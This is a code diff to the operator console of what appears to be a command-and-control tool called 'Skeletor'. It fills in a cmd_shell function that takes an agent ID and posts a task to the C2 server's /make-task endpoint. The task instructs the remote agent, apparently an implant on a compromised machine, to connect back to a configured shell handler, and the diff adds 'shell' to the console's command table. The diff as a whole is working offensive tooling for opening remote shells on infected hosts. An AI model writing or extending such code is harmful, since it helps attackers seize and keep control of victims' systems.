@@ -116,7 +116,15 @@ def cmd_multiexec():
             print(f"\n{e}\n")
 
 def cmd_shell():
-    pass
+    print(f"\nConfigured shell handler address is {SKELETOR_SHELL_HANDLER_ADDR}\n")
+    target = input("Agent ID to launch shell on: ").strip()
+    try:
+        data = {'agent_id': target, 'action': 'command', 'input': SKELETOR_SHELL_HANDLER_ADDR}
+        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data,headers=CUSTOM_HEADERS)
+        print(f"Shell task created for {target}, check the shell handler\n")
+    except Exception as e:
+            print(f"\n{e}\n")
+
 
 def cmd_result():
     pass
@@ -131,6 +139,7 @@ def main():
     "command": cmd_issuecmd,
     "cmd": cmd_issuecmd,
     "multiexec": cmd_multiexec,
+    "shell": cmd_shell,
     "help": cmd_help,
     "h": cmd_help,
     "exit": cmd_exit,
